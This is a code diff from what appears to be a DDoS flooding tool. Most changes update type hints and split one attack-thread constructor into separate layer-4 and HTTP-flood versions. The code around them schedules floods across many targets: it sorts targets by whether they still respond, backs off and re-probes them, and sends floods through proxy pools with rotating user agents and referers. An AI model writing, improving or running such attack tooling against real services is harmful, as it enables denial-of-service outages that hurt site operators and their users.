@@ -4,12 +4,16 @@ import logging
 import threading
 import time
 from dataclasses import dataclass, field
-from typing import Dict, List, Optional, Set, Tuple
 
 from PyRoxy import Proxy
 from yarl import URL
 
-from ..adapter.methods import L4_METHODS, make_attack_thread
+from ..adapter.methods import (
+    L4_METHODS,
+    make_httpflood_attack_thread,
+    make_layer4_attack_thread,
+)
+from ..redaction import mask_target_key
 from .health import (
     ERROR_KIND_DNS,
     ERROR_KIND_REFUSED,
@@ -20,7 +24,6 @@ from .health import (
     HARD_COOLDOWN_KINDS,
     TargetHealth,
 )
-from ..redaction import mask_target_key
 
 logger = logging.getLogger("BaseTool")
 
@@ -33,13 +36,13 @@ DISCOVERY_ATTEMPTS_PER_TARGET = 2
 class TargetJob:
     method: str
     target_key: str
-    layer4_addr: Optional[Tuple[str, int]] = None
-    url: Optional[URL] = None
-    host: Optional[str] = None
+    layer4_addr: tuple[str, int] | None = None
+    url: URL | None = None
+    host: str | None = None
     rpc: int = 1
-    proxies: Optional[Set[Proxy]] = None
-    useragents: Set[str] = field(default_factory=set)
-    referers: Set[str] = field(default_factory=set)
+    proxies: set[Proxy] | None = None
+    useragents: set[str] = field(default_factory=set)
+    referers: set[str] = field(default_factory=set)
 
 
 class TargetScheduler:
@@ -55,17 +58,17 @@ class TargetScheduler:
     POOL_DEGRADED = 2
     POOL_COOLDOWN_PROBE = 3
 
-    def __init__(self, jobs: List[TargetJob], target_health: TargetHealth, worker_count: int = 1):
+    def __init__(self, jobs: list[TargetJob], target_health: TargetHealth, worker_count: int = 1):
         self.jobs = jobs
         self.target_health = target_health
         self.worker_count = max(1, worker_count)
         self._lock = threading.Lock()
-        self._backoff_until: Dict[str, float] = {}
+        self._backoff_until: dict[str, float] = {}
         self._cursor = 0
         self._probe_cursor = 0
         self._pick_counter = 0
 
-    def _pick_round_robin(self, group: List[TargetJob], probe: bool = False) -> TargetJob:
+    def _pick_round_robin(self, group: list[TargetJob], probe: bool = False) -> TargetJob:
         if probe:
             job = group[self._probe_cursor % len(group)]
             self._probe_cursor += 1
@@ -74,26 +77,26 @@ class TargetScheduler:
         self._cursor += 1
         return job
 
-    def _failure_streak(self, key: str, snapshot: Dict[str, Dict[str, object]]) -> int:
+    def _failure_streak(self, key: str, snapshot: dict[str, dict[str, object]]) -> int:
         entry = snapshot.get(key, {})
-        return int(entry.get("consecutive_failures", 0)) or max(
+        return int(entry.get("consecutive_failures", 0)) or max(    # type: ignore
             0,
-            int(entry.get("attempts", 0)) - int(entry.get("successes", 0)),
+            int(entry.get("attempts", 0)) - int(entry.get("successes", 0)),  # type: ignore
         )
 
     def _consecutive_failure_streak(
-        self, key: str, snapshot: Dict[str, Dict[str, object]]
+        self, key: str, snapshot: dict[str, dict[str, object]]
     ) -> int:
         entry = snapshot.get(key, {})
-        return int(entry.get("consecutive_failures", 0))
+        return int(entry.get("consecutive_failures", 0))    # type: ignore
 
     def _is_currently_healthy(
         self,
         key: str,
-        entry: Dict[str, object],
-        snapshot: Dict[str, Dict[str, object]],
+        entry: dict[str, object],
+        snapshot: dict[str, dict[str, object]],
     ) -> bool:
-        if int(entry.get("successes", 0)) <= 0:
+        if int(entry.get("successes", 0)) <= 0: # type: ignore
             return False
         streak = self._consecutive_failure_streak(key, snapshot)
         if streak < self.HEALTHY_DEMOTION_STREAK:
@@ -104,12 +107,12 @@ class TargetScheduler:
     def _pool_for_entry(
         self,
         key: str,
-        entry: Dict[str, object],
+        entry: dict[str, object],
         now: float,
         in_backoff: bool,
     ) -> int:
-        successes = int(entry.get("successes", 0))
-        attempts = int(entry.get("attempts", 0))
+        successes = int(entry.get("successes", 0))      # type: ignore
+        attempts = int(entry.get("attempts", 0))        # type: ignore
         kind = str(entry.get("last_error_kind", ERROR_KIND_UNKNOWN))
 
         if successes > 0 and self._is_currently_healthy(key, entry, {key: entry}):
@@ -129,7 +132,7 @@ class TargetScheduler:
             return self.POOL_DEGRADED
         return self.POOL_DEGRADED
 
-    def summarize_pools(self, snapshot: Dict[str, Dict[str, object]], now: float) -> Dict[str, int]:
+    def summarize_pools(self, snapshot: dict[str, dict[str, object]], now: float) -> dict[str, int]:
         counts = {"healthy": 0, "discovery": 0, "degraded": 0, "closed": 0, "cooldown": 0}
         for job in self.jobs:
             key = job.target_key
@@ -154,7 +157,7 @@ class TargetScheduler:
                 counts["cooldown"] += 1
         return counts
 
-    def count_ready(self, snapshot: Dict[str, Dict[str, object]], now: float) -> int:
+    def count_ready(self, snapshot: dict[str, dict[str, object]], now: float) -> int:
         ready = 0
         for job in self.jobs:
             if self._backoff_until.get(job.target_key, 0) <= now:
@@ -163,7 +166,7 @@ class TargetScheduler:
 
     def derive_diagnosis(
         self,
-        pools: Dict[str, int],
+        pools: dict[str, int],
         *,
         proxy_mode: str,
         useful_bytes: int,
@@ -186,7 +189,7 @@ class TargetScheduler:
             return "insufficient_reachable"
         return "low_traffic_mixed"
 
-    def pick_next(self) -> Optional[TargetJob]:
+    def pick_next(self) -> TargetJob | None:
         now = time.time()
         snapshot = self.target_health.snapshot()
         self._pick_counter += 1
@@ -197,7 +200,7 @@ class TargetScheduler:
         allow_recovery_probe = (self._pick_counter % recovery_probe_budget) == 0
 
         with self._lock:
-            buckets: Dict[int, List[TargetJob]] = {
+            buckets: dict[int, list[TargetJob]] = {
                 self.POOL_HEALTHY: [],
                 self.POOL_DISCOVERY: [],
                 self.POOL_DEGRADED: [],
@@ -220,15 +223,15 @@ class TargetScheduler:
                 return self._pick_round_robin(discovery)
 
             if allow_recovery_probe:
-                recovery_candidates: List[TargetJob] = []
+                recovery_candidates: list[TargetJob] = []
                 for job in self.jobs:
                     key = job.target_key
                     entry = snapshot.get(key, {})
                     kind = str(entry.get("last_error_kind", ERROR_KIND_UNKNOWN))
                     if kind not in HARD_COOLDOWN_KINDS:
                         continue
-                    successes = int(entry.get("successes", 0))
-                    attempts = int(entry.get("attempts", 0))
+                    successes = int(entry.get("successes", 0))  # type: ignore
+                    attempts = int(entry.get("attempts", 0))    # type: ignore
                     if successes > 0:
                         if self._is_currently_healthy(key, entry, snapshot):
                             continue
@@ -252,7 +255,7 @@ class TargetScheduler:
                 return self._pick_round_robin(group)
             return None
 
-    def _backoff_delay(self, key: str, snapshot: Dict[str, Dict[str, object]], streak: int) -> float:
+    def _backoff_delay(self, key: str, snapshot: dict[str, dict[str, object]], streak: int) -> float:
         entry = snapshot.get(key, {})
         kind = str(entry.get("last_error_kind", ERROR_KIND_UNKNOWN))
         if kind in HARD_COOLDOWN_KINDS:
@@ -308,41 +311,38 @@ class FloodWorker(threading.Thread):
     def _success_count(self, key: str) -> int:
         snapshot = self.target_health.snapshot()
         entry = snapshot.get(key, {})
-        return int(entry.get("successes", 0))
+        return int(entry.get("successes", 0))   # type: ignore
 
     def _execute_job(self, job: TargetJob) -> None:
         if job.method in L4_METHODS:
-            instance = make_attack_thread(
+            instance = make_layer4_attack_thread(
                 job.method,
                 target_key=job.target_key,
                 stats_dict=self.stats_dict,
                 stats_lock=self.stats_lock,
                 synevent=self.event,
                 target_health=self.target_health,
-                l4_target=job.layer4_addr,
+                l4_target=job.layer4_addr,  # type: ignore
                 proxies=job.proxies,
             )
-            instance.select(job.method)
-            instance.SENT_FLOOD()
-            return
-
-        instance = make_attack_thread(
-            job.method,
-            target_key=job.target_key,
-            stats_dict=self.stats_dict,
-            stats_lock=self.stats_lock,
-            synevent=self.event,
-            target_health=self.target_health,
-            thread_id=self.worker_id,
-            url=job.url,
-            host=job.host,
-            rpc=job.rpc,
-            useragents=job.useragents,
-            referers=job.referers,
-            proxies=job.proxies,
-        )
-        instance.select(job.method)
-        instance.SENT_FLOOD()
+        else:
+            instance = make_httpflood_attack_thread(
+                job.method,
+                target_key=job.target_key,
+                stats_dict=self.stats_dict,
+                stats_lock=self.stats_lock,
+                synevent=self.event,
+                target_health=self.target_health,
+                thread_id=self.worker_id,
+                url=job.url,
+                host=job.host,  # type: ignore
+                rpc=job.rpc,
+                useragents=job.useragents,
+                referers=job.referers,
+                proxies=job.proxies,
+            )
+        instance.select(job.method)     # type: ignore[attr-defined]
+        instance.SENT_FLOOD()           # type: ignore[attr-defined]
 
     def run(self):
         self.event.wait()
